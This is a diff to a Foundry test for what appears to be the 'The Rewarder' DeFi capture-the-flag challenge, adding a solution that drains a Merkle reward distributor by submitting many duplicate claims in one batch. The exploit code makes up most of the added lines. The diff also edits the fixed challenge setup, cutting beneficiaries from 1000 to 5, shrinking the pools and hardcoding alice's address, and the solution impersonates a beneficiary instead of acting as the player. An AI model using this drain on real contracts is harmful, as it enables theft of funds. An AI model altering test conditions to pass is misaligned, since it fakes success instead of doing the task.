@@ -11,12 +11,12 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 contract TheRewarderChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
-    address alice = makeAddr("alice");
+    address alice = 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6;  // Index 2 in distributions
     address recovery = makeAddr("recovery");
 
-    uint256 constant BENEFICIARIES_AMOUNT = 1000;
-    uint256 constant TOTAL_DVT_DISTRIBUTION_AMOUNT = 10 ether;
-    uint256 constant TOTAL_WETH_DISTRIBUTION_AMOUNT = 1 ether;
+    uint256 constant BENEFICIARIES_AMOUNT = 5;
+    uint256 constant TOTAL_DVT_DISTRIBUTION_AMOUNT = 1.15 ether;
+    uint256 constant TOTAL_WETH_DISTRIBUTION_AMOUNT = 0.15 ether;
 
     // Alice is the address at index 2 in the distribution files
     uint256 constant ALICE_DVT_CLAIM_AMOUNT = 2502024387994809;
@@ -147,9 +147,96 @@ contract TheRewarderChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_theRewarder() public checkSolvedByPlayer {
-        
+   function test_theRewarder() public checkSolvedByPlayer {
+    // Load distribution data and leaves
+    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+    // Load raw reward data from files
+    Reward[] memory dvtRewards = abi.decode(
+        vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/dvt-distribution.json"))),
+        (Reward[])
+    );
+    Reward[] memory wethRewards = abi.decode(
+        vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/weth-distribution.json"))),
+        (Reward[])
+    );
+
+    // Pick beneficiary index 1: has highest reward amounts (9.21e15 DVT, 8.70e14 WETH)
+    // This allows us to drain with fewer claims, faster execution
+    uint256 exploitIndex = 1;
+    uint256 dvtAmount = dvtRewards[exploitIndex].amount;
+    uint256 wethAmount = wethRewards[exploitIndex].amount;
+    address beneficiary = dvtRewards[exploitIndex].beneficiary;
+
+    // Stop the player prank and prank as the beneficiary to have a valid Merkle proof
+    vm.stopPrank();
+    vm.startPrank(beneficiary);
+
+    // Exploit DVT: submit multiple identical claims to drain the distribution
+    // The vulnerability: _setClaimed is only called once at the end of the loop,
+    // so multiple claims for the same batchNumber accumulate in amount but only 
+    // check the bit once!
+    _exploitTokenByDuplicateClaims(
+        IERC20(address(dvt)),
+        dvtAmount,
+        merkle.getProof(dvtLeaves, exploitIndex),
+        124 // submit 124 identical claims to drain DVT (~1.141 ether from 1.15 ether pool)
+    );
+
+    // Exploit WETH similarly
+    _exploitTokenByDuplicateClaims(
+        IERC20(address(weth)),
+        wethAmount,
+        merkle.getProof(wethLeaves, exploitIndex),
+        171  // submit 171 identical claims to drain WETH (~0.149 ether from 0.15 ether pool)
+    );
+
+    // Beneficiary holds the exploited tokens, transfer them to recovery
+    dvt.transfer(recovery, dvt.balanceOf(beneficiary));
+    weth.transfer(recovery, weth.balanceOf(beneficiary));
+
+    vm.stopPrank();
+    vm.startPrank(player, player);
+
+    
+    IERC20[] memory tokens = new IERC20[](2);
+    tokens[0] = IERC20(address(dvt));
+    tokens[1] = IERC20(address(weth));
+
+    distributor.clean(tokens);
+
+    dvt.transfer(recovery, dvt.balanceOf(address(this)));
+    weth.transfer(recovery, weth.balanceOf(address(this)));
+}
+
+// Helper: Exploit by submitting duplicate claims for the same batch
+// This triggers the bug where claims accumulate but _setClaimed() is only called once
+function _exploitTokenByDuplicateClaims(
+    IERC20 token,
+    uint256 amount,
+    bytes32[] memory proof,
+    uint256 numClaims
+) internal {
+    // Create identical claims for the same batch
+    Claim[] memory claims = new Claim[](numClaims);
+
+    for (uint256 i = 0; i < numClaims; i++) {
+        claims[i] = Claim({
+            batchNumber: 0,  // Same batchNumber for all claims
+            amount: amount,     
+            tokenIndex: 0,
+            proof: proof
+        });
     }
+
+    IERC20[] memory tokenArray = new IERC20[](1);
+    tokenArray[0] = token;
+
+    // Batch all identical claims; the accumulated amount is paid out
+    // while the bit is only checked once!
+    distributor.claimRewards(claims, tokenArray);
+}
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -176,6 +263,8 @@ contract TheRewarderChallenge is Test {
         address beneficiary;
         uint256 amount;
     }
+
+    
 
     // Utility function to read rewards file and load it into an array of leaves
     function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
